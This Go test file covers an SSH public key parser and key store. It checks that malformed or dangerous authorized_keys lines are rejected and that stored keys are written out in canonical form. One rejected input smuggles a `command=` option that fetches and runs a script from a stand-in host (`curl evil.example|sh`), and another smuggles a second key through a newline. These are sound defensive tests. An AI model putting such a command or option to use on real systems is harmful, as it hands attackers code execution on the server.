package sshkeys

import (
	"encoding/base64"
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// blob builds a public key blob: the type string then some key bytes.
func blob(typ string, key []byte) string {
	b := binary.BigEndian.AppendUint32(nil, uint32(len(typ)))
	b = append(b, typ...)
	b = binary.BigEndian.AppendUint32(b, uint32(len(key)))
	return base64.StdEncoding.EncodeToString(append(b, key...))
}

var edKey = "ssh-ed25519 " + blob("ssh-ed25519", make([]byte, 32)) + " zane@laptop"

func TestParse(t *testing.T) {
	k, err := Parse(edKey)
	if err != nil || k.Type != "ssh-ed25519" || !strings.HasPrefix(k.Fingerprint, "SHA256:") {
		t.Fatalf("%+v %v", k, err)
	}
	for name, line := range map[string]string{
		"options first":    `command="curl evil.example|sh" ` + edKey,
		"restrict option":  "restrict,port-forwarding " + edKey,
		"newline smuggled": edKey + "\nssh-ed25519 " + blob("ssh-ed25519", []byte("x")),
		"unknown type":     "ssh-dss " + blob("ssh-dss", []byte("x")),
		"type mismatch":    "ssh-ed25519 " + blob("ssh-rsa", []byte("x")),
		"not base64":       "ssh-ed25519 !!!notbase64",
		"empty":            "",
		"private key":      "-----BEGIN OPENSSH PRIVATE KEY-----",
		"huge":             "ssh-ed25519 " + blob("ssh-ed25519", make([]byte, 20000)),
		"truncated blob":   "ssh-ed25519 " + base64.StdEncoding.EncodeToString([]byte{0, 0, 0, 99, 's'}),
	} {
		if _, err := Parse(line); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestStore(t *testing.T) {
	path := filepath.Join(t.TempDir(), "ssh-keys.json")
	s, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	k, err := s.Add("laptop", edKey, "zane@example.com")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Add("again", edKey, "zane@example.com"); err == nil {
		t.Fatal("the same key added twice")
	}
	// What sshd reads: canonical lines, the user's comment replaced by ours,
	// never an option.
	ak := string(s.AuthorizedKeys())
	if ak != "ssh-ed25519 "+blob("ssh-ed25519", make([]byte, 32))+" skybreaker-"+k.ID+"\n" {
		t.Fatalf("authorized_keys %q", ak)
	}
	s2, _ := Open(path)
	if l := s2.List(); len(l) != 1 || l[0].Name != "laptop" || l[0].AddedBy != "zane@example.com" {
		t.Fatalf("after reopen %+v", l)
	}
	if err := s2.Delete(k.ID); err != nil || len(s2.AuthorizedKeys()) != 0 {
		t.Fatalf("delete: %v %q", err, s2.AuthorizedKeys())
	}
	if err := s2.Delete("nope"); err == nil {
		t.Fatal("deleted a key that isn't there")
	}
	fi, _ := os.Stat(path)
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("mode %v", fi.Mode().Perm())
	}
	if _, err := s2.Add(strings.Repeat("x", 101), edKey, "z"); err == nil {
		t.Fatal("a 101-character name")
	}
}
